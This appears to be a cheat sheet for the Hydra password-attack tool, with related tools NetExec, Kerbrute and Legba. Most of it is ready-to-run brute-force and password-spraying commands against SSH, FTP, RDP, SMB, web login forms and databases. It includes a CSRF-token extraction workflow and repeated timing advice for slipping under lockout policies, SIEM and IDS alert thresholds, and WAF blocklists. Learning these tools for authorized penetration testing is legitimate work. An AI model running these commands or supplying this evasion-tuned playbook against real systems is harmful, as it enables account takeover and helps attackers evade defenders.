Online Credential Testing · Brute-Force & Spraying

Hydra

A high-performance parallelized authentication attack tool supporting over 50 protocols. Master lockout-safe password spraying, low-and-slow timing controls, CSRF token handling, and multi-protocol credential testing across SSH, HTTP, RDP, SMB, and database backends.

First 3 Commands — Quick Start
Start with a spray to avoid lockouts, then brute-force a single account if needed.
$ hydra -L users.txt -p 'Welcome@2024' -t 1 -W 30 ssh://10.0.0.5 Password spray (one password, many users)
$ hydra -l admin -P rockyou.txt -t 4 -W 5 ssh://10.0.10.1 Targeted SSH brute-force (single user)
$ hydra -l admin -P rockyou.txt -t 4 -W 5 10.0.10.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid" HTTP form attack (calibrated -t 4 -W 5)

Critical Pitfalls & Safety

Why is Hydra failing (or locking accounts)? — The spray, timing, and CSRF traps.
  • Account lockouts are real and immediate: A traditional brute-force (many passwords against one user) will trigger lockout policies (often 3–5 attempts) and alert defenders within minutes. Password spraying (one password against many users) is the standard technique to avoid this.
  • -t 16 is aggressive and unreliable: High thread counts cause failures on RDP and SSH, and trip rate-limiting on web apps. Use -t 4 or lower for SSH/RDP, and -t 1 for spraying to stay under the radar.
  • Hydra cannot handle CSRF tokens natively: If a login form includes a dynamic CSRF token, Hydra will fail because the token changes on every request. You must manually extract a valid token and session cookie and inject them into the command, or Hydra will either falsely report success or fail completely.
  • Default Hydra against modern services often fails: Lockouts, rate limiting, CAPTCHAs, and SIEM detection rules mean stock Hydra is best used against internal, legacy, or default-credential environments.
Spraying beats brute-force in 2026. Password spraying tests one or two common passwords (e.g., Welcome@2024, CompanyName@2024) against every username in a list. Each user sees only one failed attempt, so lockouts don't trigger. Use the -u flag to loop over users first (instead of passwords), and use -W to insert a wait between attempts.

Password Spraying (Lockout-Safe)

Password spraying — one password, many users
This tries the single password Welcome@2024 against every username in users.txt. -t 1 sends one attempt at a time, and -W 30 waits 30 seconds between attempts. No single account accumulates multiple failures, so lockout policies are not triggered.
$ hydra -L users.txt -p 'Welcome@2024' -t 1 -W 30 ssh://10.0.10.5 Single-password spray with 30s inter-attempt delay
Lockout Protection: When spraying 500 enterprise users with -t 1 -W 30, each attempt tests a different account. No account experiences a second failed attempt until all 500 have been tried (over 4 hours later), cleanly evading rolling lockout counters.
Multi-password spraying with user looping (-u)
Loop through all users for password 1 before advancing to password 2 to avoid locking individual accounts.
$ hydra -L users.txt -P seasonal_passwords.txt -u -t 1 -W 20 ssh://10.0.10.5 Test each candidate password across all users before next password
$ hydra -L service_accounts.txt -e nsr -t 1 -W 10 -o spray_found.txt ssh://10.0.10.5 Spray blank, username-as-password, and reversed username

Timing & Evasion

Slow-and-low timing (-W 60)
One attempt per minute. Stays under most rate-limiting thresholds. Use this when you know a lockout policy exists (e.g., 5 attempts per 15 minutes).
$ hydra -l admin -P passwords.txt -t 1 -W 60 ssh://10.0.10.5 1 attempt per minute to stay under IDS/SIEM alert limits
Detection Thresholds: Most Security Operations Centers (SOCs) configure alerts for >5 failed logins within 10 minutes from a single IP. An inter-request delay of -W 60 keeps rate below typical static threshold triggers.
Calibrated SSH connection stability (-t 4)
Prevent connection drops caused by OpenSSH MaxStartups throttling.
$ hydra -l admin -P rockyou.txt -t 4 -W 5 ssh://10.0.10.1 Conservative thread count (4) with 5s delay prevents packet drops
$ hydra -l admin -P pass.txt -t 2 -W 10 10.0.10.1 http-post-form "/login:u=^USER^&p=^PASS^:F=fail:H=User-Agent\: Mozilla/5.0" Custom User-Agent header to evade default WAF blocklists

SSH / FTP / Telnet

SSH credential brute-force (-f stop on first)
Target a known administrator account with calibrated thread limits.
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://10.10.10.1 Stop immediately upon discovering correct SSH password
$ hydra -L users.txt -P pass.txt -t 4 -W 3 -o found_ssh.txt ssh://10.10.10.1 Multi-user test logging successful creds to disk
Evidence Trail: Always use -o <file> — the resulting log records discovered credentials and timestamps, providing an audit trail for your penetration testing report.
FTP anonymous & dictionary authentication
Verify anonymous access or execute parallel credential testing on FTP.
$ hydra -l anonymous -p "" ftp://10.10.10.1 Test for open unauthenticated FTP anonymous access
$ hydra -L users.txt -P pass.txt -t 8 ftp://10.10.10.1 FTP dictionary test against harvested user list
Non-standard port targeting & Telnet legacy testing
Specify custom service ports using -s or URL colon notation.
$ hydra -l root -P rockyou.txt -s 2222 ssh://10.10.10.1 Target SSH running on non-default port 2222
$ hydra -l admin -P rockyou.txt telnet://10.10.10.1:2323 Target Telnet device console with custom port

HTTP Forms & CSRF Handling

CSRF token check: Why Hydra fails on modern login forms. If the login form includes a hidden user_token or csrf_token field, Hydra will fail. Because Hydra cannot parse dynamic HTML tokens per request, you must first extract a valid token and session cookie with curl, then inject them into the command.
CSRF token extraction & injection workflow
Pre-fetch CSRF token and session cookies before launching Hydra against protected forms.
$ CSRF=$(curl -s -c cookie.txt "http://10.0.10.1/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2) Step 1: Extract CSRF token and save session cookie
$ hydra -l admin -P passwords.txt 10.0.10.1 http-post-form "/login.php:username=^USER^&password=^PASS^&user_token=${CSRF}:F=Invalid" Step 2: Inject extracted CSRF variable into HTTP POST form
Syntax Breakdown for http-post-form: /url:parameters:condition[:optional_headers]. Use F=failed_text (stop when string is NOT found) or S=success_text (stop when string IS found). Use ^USER^ and ^PASS^ as placeholders.
Standard HTTP POST form brute-force
Attack web application login forms with custom POST parameters and failure condition.
$ hydra -l admin -P rockyou.txt -t 4 -W 5 10.0.10.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials" HTTP POST attack calibrated with -t 4 -W 5 to prevent web rate-limiting
$ hydra -l admin -P pass.txt 10.0.10.1 https-post-form "/admin/login:username=^USER^&password=^PASS^:S=302:H=Cookie\: PHPSESSID=abc123" HTTPS attack with session cookie detecting 302 redirect on success
HTTP Basic & Digest authentication (401 Unauthorized)
For web servers, routers, and webcams protected by HTTP 401 modal authentication.
$ hydra -l admin -P rockyou.txt http-get://10.0.10.1/admin/ HTTP Basic auth over cleartext HTTP
$ hydra -l admin -P rockyou.txt https-get://10.0.10.1/manager/html HTTPS Basic auth (Tomcat Web Application Manager)

RDP / SMB / Databases

RDP brute-force (Remote Desktop Protocol — Port 3389)
Windows Remote Desktop requires low concurrency (-t 1 or -t 2) and generous delay to avoid crashing FreeRDP or tripping event alarms.
$ hydra -l Administrator -P rockyou.txt -t 1 -W 10 rdp://10.10.10.1 Single-threaded with 10s wait (6/min to avoid Event 4625 alerting)
$ hydra -l "CORP\admin" -P pass.txt -t 1 -W 10 rdp://10.10.10.1 Domain credential format with NetBIOS domain prefix
Prerequisites & Alerting: Requires freerdp2-x11 (install via sudo apt install -y freerdp2-x11). On monitored Windows targets, maintain -W 10 or higher (6 attempts/minute) to prevent rapid Event ID 4625 bursts that trip SIEM threshold alerts.
SMB Windows share & domain credential testing
Audit SMB / CIFS service (port 445) across domain and standalone hosts.
$ hydra -L users.txt -P pass.txt -t 2 smb://10.10.10.1 SMB dictionary attack with 2 concurrent worker tasks
$ hydra -l "DOMAIN\svc_backup" -p 'Spring2026!' smb://10.10.10.1 Single credential validation on SMB endpoint
Prerequisites: Hydra's smb:// module requires Samba client libraries — on minimal or container environments, install with sudo apt install -y smbclient libsmbclient.
Database backend authentication (MySQL & PostgreSQL)
Test database administrative credentials exposed on default listening ports.
$ hydra -l root -P rockyou.txt -t 4 mysql://10.10.10.1 MySQL administrative root credential testing
$ hydra -l postgres -P rockyou.txt -t 4 postgres://10.10.10.1 PostgreSQL superuser account testing

Modern Alternatives — NetExec, Kerbrute & Legba

ToolPrimary Use CaseWhy it's better than Hydra
NetExec (nxc) Active Directory / SMB / SSH / WinRM spraying Built natively for spraying across whole subnets at scale without accidental lockouts
Kerbrute Kerberos pre-authentication spraying Stealthier in AD; checks pre-auth against KDC, avoiding noisy Event ID 4625 failed logins
Legba High-speed modern multi-protocol brute-force Rust async engine benchmarked 4.5x–55x faster than Hydra with native CSRF extraction
NetExec (nxc) — Subnet password spraying at scale
The gold standard tool for enterprise Active Directory, SMB, and SSH spraying without locking accounts. Install: pipx install netexec (or apt install netexec on Kali 2024.2+)
$ nxc ssh 192.168.1.0/24 -u users.txt -p 'Password1!' --no-bruteforce Spray one password across entire subnet without multiple failed attempts per user
$ nxc smb 10.0.10.0/24 -u users.txt -p 'Welcome@2024' --continue-on-success SMB enterprise spray with immediate Pwn3d! admin notification
Prerequisites: Install via pipx install netexec across Linux distributions, or sudo apt install -y netexec on Kali Linux 2024.2+.
Kerbrute — Active Directory Kerberos pre-auth spraying
Validate credentials directly against Kerberos Key Distribution Center (KDC) over UDP port 88. Install: GitHub Release binary
$ kerbrute passwordspray -d corp.local --dc 10.0.10.2 users.txt 'Welcome@2024' Kerberos pre-authentication spray avoiding Windows NTLM event noise
Prerequisites: Download pre-compiled binary from github.com/ropnop/kerbrute/releases and install to /usr/local/bin/kerbrute.
Legba — Modern high-throughput asynchronous engine
Written in Rust: combines memory safety, asynchronous I/O, and automated CSRF parsing. Install: cargo install --git https://github.com/evilsocket/legba (or GitHub binary)
$ legba ssh --target 10.0.10.1:22 --username admin --wordlist rockyou.txt High-speed asynchronous SSH brute-force with automatic backoff
Prerequisites: Install via cargo install --git https://github.com/evilsocket/legba or download pre-compiled release binaries from github.com/evilsocket/legba/releases.
